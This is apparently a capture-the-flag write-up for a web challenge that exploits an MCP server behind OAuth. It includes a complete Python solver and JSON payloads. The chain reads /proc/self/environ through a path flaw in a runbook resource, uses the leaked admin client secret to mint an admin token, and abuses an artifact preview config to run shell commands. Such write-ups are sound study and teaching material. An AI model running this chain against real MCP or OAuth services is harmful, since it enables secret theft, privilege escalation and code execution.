---
title: "HyperSonic CTF 2026 mcpp Writeup"
description: "HyperSonic CTF 2026 mcpp writeup"
---

# mcpp

## Overview

`mcpp` is a `web` challenge where, after going through OAuth authentication, you call `resource`s and `tool`s at an MCP endpoint. A user-privileged MCP session can read a runbook `resource`, and gaining admin privileges opens access to tools that write `artifact`s as well.

The conditions I confirmed are as follows.

- Category: `web`
- Main interfaces: OAuth token flow, MCP `resources/read`, MCP `tools/call`
- User privilege: `hypersonic:user`
- Admin privilege: `hypersonic:admin`
- Goal: start with user privileges, open the admin MCP tools, and read the flag through the `preview` renderer.

The runbook `resource` handles the `ref` value in the URI as a file path. From this I get a file read, and I chain the admin `secret` found in the environment variables into an OAuth privilege escalation. After that, aligning the `preview` configuration structure of `admin_write_artifact` and `read_artifact` leads to command execution.

## Challenge analysis

First, let me define the terms used in this writeup.

- `MCP session`: a session where you send `initialize` to `/mcp` with a Bearer token and then reuse the `mcp-session-id` from the response header.
- `resource`: the target read via MCP's `resources/read`. In this challenge a URI of the form `hypersonic://runbook/{ref}` appears.
- `tool`: a function executed via MCP's `tools/call`.
- `artifact`: an analysis-result object managed by the service. Some tools write or read this object.
- `profile.defaults.views`: the configuration that determines the `preview` behavior of an `artifact`.
- `adapter`, `renderer`, `command`: the values referenced in turn during `preview` generation.

The authentication flow starts from regular user privileges. After dynamic client registration, running a PKCE-backed authorization code grant gets you a token in the `hypersonic:user` scope. Sending `initialize` to `/mcp` with this token and receiving an `mcp-session-id` is where MCP requests start being processed.

Looking at the MCP `resource` list, there is a URI for reading a runbook.

```text
hypersonic://runbook/{ref}
```

Here `ref` is decoded into a file path. So URL-encoding an absolute path reads an arbitrary file on the server.

```text
hypersonic://runbook/%2Fproc%2Fself%2Fenviron
```

This request exposes the process environment variables, and within them I was able to find the `HYPERSONIC_ADMIN_CLIENT_SECRET` value. This value is used as the admin client's `secret`.

Next I checked the token issuance path. Separate from the `/token` used for user login, a `client_credentials` grant works at `POST /oauth/token`.

```text
grant_type=client_credentials
client_id=hypersonic-admin
client_secret=<leaked secret>
scope=hypersonic:admin
```

Reopening an MCP session with the token obtained this way adds the admin tools. The tool needed for the solution here is `admin_write_artifact`. This tool takes an `artifact_json` argument, whose value must be a JSON string, not a JSON object.

An `artifact` written with `admin_write_artifact` generates a `preview` when read again with `read_artifact`. Aligning the `preview` behavior, the default configuration lookup follows this structure.

```text
adapter  = defaults["views"]["preview"]["adapter"]
renderer = views["adapters"][adapter]["renderer"]
command  = views["renderers"][renderer]["command"]
```

At first I put values in `defaults["adapters"]` and `defaults["renderers"]`, but the default `renderer` kept running.

```text
["/bin/echo", "artifact-preview-ready"]
```

This is because the lookup continues inside `defaults.views`. So `adapters` and `renderers` must also be placed under `defaults.views` to change the `preview`'s `command`.

## Core idea

The solution runs in four steps.

```text
1. Obtain a user token via the OAuth PKCE flow.
2. Read files using the path-handling flaw in the MCP runbook resource.
3. Obtain the admin client `secret` from the environment variables and issue an admin token.
4. Manipulate the admin artifact's preview configuration so the renderer executes a command.
```

The first vulnerability is that the runbook `resource` does not restrict `ref` to a safe document identifier. Because of this, user privileges alone can read internal files on the server, and the admin `secret` in the environment variables becomes the input for the next step.

The second link is the OAuth token endpoint. If you know the admin client `secret`, a `client_credentials` grant gets you a token in the `hypersonic:admin` scope. Once admin privileges are gained, hidden MCP tools become visible, and among them `admin_write_artifact` is the channel for changing the `preview` configuration.

Finally, the location of the `preview` renderer's configuration lookup matters. `preview.adapter` is read from `defaults.views.preview`, and `adapters` and `renderers` are then looked up under the same `views` object. So the payload must build a renderer that executes a `command` inside `defaults.views`, not at the top-level `defaults`.

## Solution

### Step 1. Open an MCP session with a user token

First, register a dynamic client and prepare the PKCE values. The `/authorize` request returns an authorization code appended to the redirect URL, so submitting this authorization code and the `code_verifier` to `/token` obtains a user token.

After obtaining the token, send an `initialize` request to `/mcp`. You must put the `mcp-session-id` from the response header into subsequent request headers to use `resources/read` and `tools/call` properly.

The value obtained at this step is a user-privileged MCP session. The admin tools are not visible yet, but since the runbook `resource` can be read, the next step attempts a file read.

### Step 2. Read environment variables with the runbook `resource`

The runbook URI is of the form `hypersonic://runbook/{ref}`. Since `ref` is URL-decoded and then used like a file path, encoding an absolute path produces an arbitrary file read.

```text
hypersonic://runbook/%2Fproc%2Fself%2Fenviron
```

The response is returned like ordinary runbook markdown, but the actual content is the process environment variables. From here I obtain the `secret` needed to issue an admin token.

```text
HYPERSONIC_ADMIN_CLIENT_SECRET=<secret>
```

I also tried reading candidate flag paths directly, but the flag did not appear at this step, so the file read is only used to obtain the `secret` needed for privilege escalation.

### Step 3. Get the admin token and check the tool list

Use the `secret` obtained from the environment variables as the `secret` of the `hypersonic-admin` client. The hidden `/oauth/token` path accepts a `client_credentials` grant, so the following request issues an admin-scoped token.

```text
POST /oauth/token
grant_type=client_credentials
client_id=hypersonic-admin
client_secret=<secret>
scope=hypersonic:admin
```

Opening an MCP session with the new token and checking the tool list adds the admin tools. In the solution I wrote a new `artifact` with `admin_write_artifact` and induced `preview` generation with `read_artifact`.

### Step 4. Chain the `preview` configuration into command execution

The `admin_write_artifact` argument `artifact_json` is a JSON string. Placing `profile.defaults.views` inside this string changes the default `preview` behavior.

The structure needed in the payload is as follows.

```json
{
  "profile": {
    "defaults": {
      "views": {
        "preview": { "adapter": "process" },
        "adapters": {
          "process": { "renderer": "process" }
        },
        "renderers": {
          "process": {
            "command": ["/bin/sh", "-c", "id"]
          }
        }
      }
    }
  }
}
```

`preview.adapter` points to `process`, and `adapters.process.renderer` inside the same `views` object points to the `process` renderer again. Finally, `views.renderers.process.command` becomes the command array actually executed.

After writing an `artifact` with this structure and calling `read_artifact`, the specified `command` runs during `preview` generation. I first confirmed the behavior with a command that reads the hostname, then chained it into running `/readflag`.

## Exploit / Solver

The final code works in the order of user token issuance, runbook file read, admin token issuance, and `preview` generation for command execution. Below is the core routine needed for the solution.

```python
import base64
import hashlib
import json
import os
import secrets
import urllib.parse

import requests


BASE = "<base-url>"
REDIRECT_URI = "http://127.0.0.1/callback"


class McpClient:
    def __init__(self, token):
        self.session = requests.Session()
        self.next_id = 1
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream",
        }

    def start(self):
        res = self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={
                "jsonrpc": "2.0",
                "id": self.next_id,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2025-06-18",
                    "capabilities": {},
                    "clientInfo": {"name": "client", "version": "0.1"},
                },
            },
            timeout=10,
        )
        self.next_id += 1
        res.raise_for_status()
        self.headers["mcp-session-id"] = res.headers["mcp-session-id"]

        self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}},
            timeout=10,
        )

    def request(self, method, params):
        res = self.session.post(
            f"{BASE}/mcp",
            headers=self.headers,
            json={"jsonrpc": "2.0", "id": self.next_id, "method": method, "params": params},
            timeout=15,
        )
        self.next_id += 1
        res.raise_for_status()
        return res.json()

    def tool(self, name, arguments=None):
        data = self.request("tools/call", {"name": name, "arguments": arguments or {}})
        return data["result"]["content"][0]["text"]

    def read_resource(self, uri):
        data = self.request("resources/read", {"uri": uri})
        return data["result"]["contents"][0]["text"]

    def lfi(self, path):
        uri = "hypersonic://runbook/" + urllib.parse.quote(path, safe="")
        return self.read_resource(uri)


def pkce_user_token():
    session = requests.Session()
    reg = session.post(
        f"{BASE}/register",
        json={
            "redirect_uris": [REDIRECT_URI],
            "client_name": "client",
            "grant_types": ["authorization_code", "refresh_token"],
            "response_types": ["code"],
            "scope": "hypersonic:user",
            "token_endpoint_auth_method": "client_secret_post",
        },
        timeout=10,
    )
    reg.raise_for_status()
    client = reg.json()

    verifier = base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")
    digest = hashlib.sha256(verifier.encode()).digest()
    challenge = base64.urlsafe_b64encode(digest).decode().rstrip("=")

    auth = session.get(
        f"{BASE}/authorize",
        params={
            "response_type": "code",
            "client_id": client["client_id"],
            "redirect_uri": REDIRECT_URI,
            "scope": "hypersonic:user",
            "state": "x",
            "code_challenge": challenge,
            "code_challenge_method": "S256",
        },
        allow_redirects=False,
        timeout=10,
    )
    auth.raise_for_status()
    query = urllib.parse.urlparse(auth.headers["Location"]).query
    code = urllib.parse.parse_qs(query)["code"][0]

    token = session.post(
        f"{BASE}/token",
        data={
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": client["client_id"],
            "client_secret": client["client_secret"],
            "code_verifier": verifier,
        },
        timeout=10,
    )
    token.raise_for_status()
    return token.json()["access_token"]


def parse_environ(text):
    env = {}
    for item in text.split("\x00"):
        if "=" in item:
            key, value = item.split("=", 1)
            env[key] = value
    return env


def admin_token(secret):
    res = requests.post(
        f"{BASE}/oauth/token",
        data={
            "grant_type": "client_credentials",
            "client_id": "hypersonic-admin",
            "client_secret": secret,
            "scope": "hypersonic:admin",
        },
        timeout=10,
    )
    res.raise_for_status()
    return res.json()["access_token"]


def command_artifact(command):
    suffix = secrets.token_hex(3).upper()
    artifact_id = f"HYP-F{suffix}"
    profile_name = f"p{suffix.lower()}"
    return artifact_id, {
        "id": artifact_id,
        "title": "Preview",
        "severity": "low",
        "summary": "preview command",
        "component": "preview",
        "affected_assets": ["preview"],
        "owner": "client",
        "tags": ["preview"],
        "profile": {
            "name": profile_name,
            "defaults": {
                "views": {
                    "preview": {"adapter": "process"},
                    "adapters": {"process": {"renderer": "process"}},
                    "renderers": {"process": {"command": command}},
                }
            },
        },
    }


def run_command(command):
    user = McpClient(pkce_user_token())
    user.start()
    env = parse_environ(user.lfi("/proc/self/environ"))

    admin = McpClient(admin_token(env["HYPERSONIC_ADMIN_CLIENT_SECRET"]))
    admin.start()

    artifact_id, artifact = command_artifact(command)
    admin.tool("admin_write_artifact", {"artifact_json": json.dumps(artifact)})
    obj = json.loads(admin.tool("read_artifact", {"artifact_id": artifact_id}))
    preview = obj["preview"]
    return preview.get("stdout", "") + preview.get("stderr", "")


print(run_command(["/bin/sh", "-c", "test -x /readflag && /readflag"]))
```

The part to watch here is the `profile.defaults.views` structure in `command_artifact`. If you place `adapters` and `renderers` outside `views`, the `preview` keeps using the default echo renderer. Conversely, placing them inside `views` as in the structure above makes the specified `command` run during the `read_artifact` process.

## Result

First I confirmed with the `["/bin/cat", "/etc/hostname"]` command that the `preview` executes the specified `command` rather than the default echo renderer. Then I ran `/readflag` to obtain the following flag.

```text
hs{4341f4768ce2bd952d7efe73cb8cfac8321feb4aab3bf1de41c178f9598fb328}
```
